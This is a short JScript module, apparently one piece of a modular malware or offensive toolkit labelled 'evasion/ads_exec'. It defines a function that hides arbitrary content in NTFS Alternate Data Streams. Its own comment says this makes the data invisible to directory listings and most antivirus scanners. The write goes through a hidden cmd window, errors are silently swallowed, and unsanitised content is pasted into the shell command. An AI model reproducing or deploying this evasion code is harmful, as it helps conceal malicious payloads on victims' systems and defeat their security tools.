// chunk: evasion/ads_exec
// depends: (none)
// provides: ads_write
// format: jscript
// note: Writes content to NTFS Alternate Data Streams. Data stored in ADS
//       is invisible to standard directory listings and most AV file scanners.

function ads_write(filePath, streamName, content) {
    try {
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        /* Ensure base file exists */
        if (!fso.FileExists(filePath)) {
            var f = fso.CreateTextFile(filePath, true);
            f.Write("");
            f.Close();
        }
        /* Write to the alternate data stream */
        var adsPath = filePath + ":" + streamName;
        var sh = new ActiveXObject("WScript.Shell");
        /* Use cmd echo to write into ADS since FSO cannot address streams directly */
        sh.Run('cmd /c echo ' + content + ' > "' + adsPath + '"', 0, true);
    } catch(e) {}
}
